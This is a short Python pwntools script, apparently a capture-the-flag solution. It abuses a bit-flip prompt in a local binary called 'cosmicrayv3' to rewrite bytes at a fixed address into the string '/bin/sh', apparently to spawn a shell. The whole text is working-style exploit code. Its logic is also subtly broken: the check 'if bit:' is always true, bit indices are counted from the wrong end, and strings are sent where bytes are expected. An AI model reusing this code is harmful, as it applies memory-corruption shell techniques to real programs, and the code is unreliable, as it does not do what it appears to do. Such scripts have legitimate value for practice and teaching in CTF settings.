from pwn import *

context.log_level = 'DEBUG'

p = process("./loot/dist/cosmicrayv3")
binary = ELF("./loot/dist/cosmicrayv3")

binshstr = b"/bin/sh\x00"


print(binary.read(0x4015aa, 1))
print(binary.read(0x4015e5, 32))

binshstrbef = binary.read(0x40204c, len(binshstr))

print(binshstr)

xorbinshstr = [a ^ b for a,b in zip(binshstrbef, binshstr)]

p.recvuntil(b"through:")
p.sendline("0x4015aa")
p.recvuntil(b"flip:")
p.sendline("0")


for i, byte in enumerate(xorbinshstr):
    for j, bit in enumerate(f"{byte:b}"):
        print(i, byte, j, bit)
        if bit:
            p.recvuntil(b"through:")
            p.sendline(f"0x{0x40204c + i:x}")
            p.recvuntil(b"flip:")
            p.sendline(f"{j}")
